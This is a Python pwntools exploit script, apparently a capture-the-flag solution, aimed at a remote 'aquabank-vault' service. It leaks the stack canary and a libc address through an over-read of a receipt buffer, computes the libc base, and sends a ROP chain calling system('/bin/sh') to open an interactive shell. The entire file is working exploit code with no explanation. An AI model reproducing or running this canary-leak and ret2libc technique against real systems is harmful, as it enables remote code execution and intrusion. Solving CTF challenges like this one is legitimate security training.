#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./aquabank-vault', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
rop = ROP(libc)


CANARY_OFF = 136
CANARY_IDX = 72
LEAK_OFF = 152
RIP_OFFSET = 152
RET = 0x000000000040101a
#PUTS_PLT = elf.plt['puts']
#PUTS_GOT = elf.got['puts']
#MAIN = elf.sym['main']
#BINSH = next(elf.search(b'/bin/sh\x00'))
#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13568)

#-------- Stage 1: leak puts-------
p.recvuntil(b'>')
p.sendline(b"1")
p.recvuntil(b'Type the receipt header (up to 64 chars):\n')
p.send(b'A' * 64)

p.recvuntil(b'--- RECEIPT ---\n')
data = p.recv(256)          # get all 256 bytes fwrite sends

# The first 64 bytes are your A's; bytes 64+ are leaked stack
leaked_bytes = data[64:]
print(f"[*] Leaked {len(leaked_bytes)} stack bytes")

# Extract a candidate address from the leaked bytes (8 bytes at a time)
for i in range(0, len(leaked_bytes) - 7, 8):
    val = u64(leaked_bytes[i:i+8])
    #print(f"offset +{i}: {hex(val)}")

canary = u64(leaked_bytes[56:64])
print(hex(canary))

libc_leak = u64(leaked_bytes[88:96])  # the address that equals __libc_start_call_main+117
print(hex(libc_leak))

for name, addr in libc.symbols.items():
    base = libc_leak - addr
    if base & 0xfff == 0:
        print(name, hex(base))

#libc.address = libc_leak - libc.sym['__libc_start_main'] - 117
libc_base = libc_leak - 0x2a1ca

pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0] 
ret = libc_base + rop.find_gadget(['ret'])[0]
#ret = libc_base + next(libc.search(asm('ret'))) 
bin_sh = libc_base + next(libc.search(b'/bin/sh')) 
system = libc_base + libc.symbols['system']
print(hex(libc_base))

#print(hex(libc_leak))
#print(hex(libc_base))
#print(hex(system))
#print("system:", hex(system))
#print("binsh:", hex(bin_sh))
#print("pop rdi:", hex(pop_rdi))

#print(hex(system & 0xfff))
#print(hex(pop_rdi & 0xfff))
#print(hex(bin_sh & 0xfff))

stage1 = flat(
    b'A' * (CANARY_OFF),
    p64(canary),
    b'A' * (152-CANARY_OFF-8), 
    p64(ret), 
    p64(pop_rdi), 
    p64(bin_sh), # address of "/bin/sh" 
    p64(system), # address of system 
    )

p.recvuntil(b'>')
p.sendline(b"2")
p.recvuntil(b"Enter your combination:")
p.send(stage1)

#p.wait()

#core = p.corefile

#crash = u64(core.read(core.rsp, 8))

#print(f"crash value = {hex(crash)}")
#print(f"offset = {cyclic_find(crash)}")

p.interactive()


